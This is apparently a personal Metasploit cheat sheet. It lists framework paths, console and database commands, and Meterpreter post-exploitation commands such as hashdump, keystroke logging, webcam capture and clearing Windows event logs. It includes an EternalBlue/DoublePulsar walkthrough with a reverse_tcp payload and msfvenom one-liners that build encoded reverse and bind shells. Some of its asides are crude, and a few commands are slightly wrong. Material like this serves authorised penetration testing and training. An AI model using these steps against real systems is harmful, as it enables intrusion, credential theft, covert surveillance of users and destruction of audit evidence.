# Metasploit framework

## Locations: 
```
/usr/share/metasploit-framework/                   - Root directory for Metasploit
/usr/share/metasploit-framework/documentation      - Simlink to the doc of the framework
/usr/share/metasploit-framework/lib                - Code base of the framework 
/usr/share/metasploit-framework/plugins            - Plugins for the framework
/usr/share/metasploit-framework/scripts            - Meterpreter is here 
/usr/share/metasploit-framework/tools              - Command line utilities 
/usr/share/metasploit-framework/data               - Contains source and compiled files  
/usr/share/metasploit-framework/modules            - Modules for payloads exploits (by os) auxiliary (by service ie sql...)

/usr/share/metasploit-framework/modules/auxiliary  - Sniffers, scanners, fuzzers, spoofers, etc
/usr/share/metasploit-framework/modules/encoders   - Payload encoders
/usr/share/metasploit-framework/modules/evasion    - Nerp?
/usr/share/metasploit-framework/modules/exploits   - Software used ot attack a vulnerability and deliver a payload
/usr/share/metasploit-framework/modules/nops       - Used to keep payload size consistent (by filling gaps)
/usr/share/metasploit-framework/modules/payloads   - Payday bitches
/usr/share/metasploit-framework/modules/post       - Additional functions that can be run on a compromised host, for persistence for instance
```

## Usefull commands:  
```bash
msf > msfconsole                                   - Start the console duh 
msf > banner                                       - Show another banner
msf > ?                                            - Help menu

msf > workspace                                    - List workspaces
msf > workspace -a [name]                          - Add workspace(s)
msf > workspace [name]                             - Switch workspace 
msf > workspace -d [name]                          - Delete workspace(s)

msf > connect                                      - Some sort of netcat clone
msf > edit                                         - Vim style editor
msf > grep                                         - Grep
msf > info                                         - Info about a module or payload
msf > jobs                                         - Same as in unix 
msf > load                                         - Load a module
msf > loadpath                                     - Load a module
msf > unload                                       - Unload a module

msf > search                                       - With options like name / type / author / platform / cve
msf > show                                         - Show payload / exploits / options / targets / advanced   
msf > use                                          - Use a specific exploit or tool such as a scanner 
msf > set                                          - Set a variable in current exploit 
msf > setg                                         - Set a variable globally 
msf > run                                          - Run a module
```

## Exploitdb:  

```bash
systemctl start postgresql                         - Start the PostgreSQL service
msfdb init                                         - Initialise the db for metasploit 
db_status                                          - Check the status of the db
```


## Store nmap scans into the db 
```bash
msf > db_nmap -sn 192.168.0.0/24                   - Sweep scan for local network 
msf > db_nmap -A 192.168.0.178 -p 1-65535          - Scan all ports on specific host .178
msf > hosts                                        - List discovered hosts
msf > services                                     - List discovered services 
msf > services -c name,port                        - Discovered services/filtered output
msf > vulns                                        - List discovered vulnerabilities 
msf > vulns -i                                     - Display vuln information 
msf > vulns -p 1-65536 -i                          - Display vuln for specific portrange
```

## Meterpreter
```bash
help           - get help
lpwd           - pwd on local machine (attacker)
pwd            - pwd on target machine
lcd            - cd on local machine (attacker)
cd             - cd on target machine
edit           - simple vim like text editor

getuid         - get user id
sysinfo        - get system info
arp            - get arp cache
idletime       - check for how long the system has been idle
ipconfig       - windows like

ps             - like lnx ps
migrate $PID   - migrate to $PID
getsystem      - attemp automatic privesc
background     - put the meterpretter in the bg of metasploit 
sessions -l    - list meterpreter sessions in metasploit
sessions -i 1  - interact with meterpreter session 1

search suggester


download       - download from target system (double slashes when giving a windows path) -> ex: download c:\\boot.ini
upload         - upload on the target system (double slashes when giving a windows path) -> ex: download c:\\boot.ini
shell          - get a standard shell from the target system
execute        - runs a single command on the target

hashdump       - get the hashdumps (like /etc/shadow)
keyscan_start  - start a keystroke logger
keyscan_dump   - get the dump from the logger
screenshot     - get a screenshot of the gui if any
webcam_list    - list currently available web cams on the target
webcam_snap    - take a dick pick

clearev        - clear system & security events on a windows system
```

## Double Pulsar - Eternal Blue: 

install the exploit
```
root: mkdir -p /root/.wine/drive_c/
root: mkdir -p /root/.msf4/modules/exploits/windows/smb
root: cd /root/.msf4/modules/exploits/windows/smb
root: git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
```

scan vulnerable hosts   
```
msf > workspace -a EternalBlue
msf > db_scan -sS -O -sV -vv 192.168.100.10
msf > search doublepulsar
msf > use auxiliary/scanner/smb/smb_ms17_010
msf > set RHOST 192.168.100.10
msf > run
msf > vulns
```

set and run the payload  
```
msf > use exploit/windows/smb/eternalblue_doublepulsar
msf > set payload windows/meterpreter/reverse_tcp
msf > set payload windows/x64/shell/reverse_tcp
msf > show options
msf > set RHOST 192.168.100.10
msf > set PROCESSINJECT explorer.exe
msf > set TARGETARCHITECTURE x64
```

## Msfvenom
```
 --platform
-p   --payload
-e   --encoder
-b   --bad-chars
-f   --format
-x   --template
-l   --list
```

```bash
msfvenom --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b "0" -f python
msfvenom --platform linux   -p linux/x86/shell/reverse_tcp LHOST=w.z.y.z LPORT=443 -b "0" -f elf -o file.bin
msfvenom --platform linux   -t shell.elf LHOST=10.10.14.25
msfvenom -x /tmp/tmp3rgnf7lr/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

## Meterpreter
```
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
```

## Staged
```
linux/x86/shell/bind_tcp
linux/x64/shell/reverse_tcp
windows/shell/bind_tcp
windows/x64/shell/reverse_tcp
```

## Stageless
```
linux/x86/shell_bind_tcp
linux/x64/shell_reverse_tcp
windows/shell_bind_tcp
windows/x64/shell_reverse_tcp
```
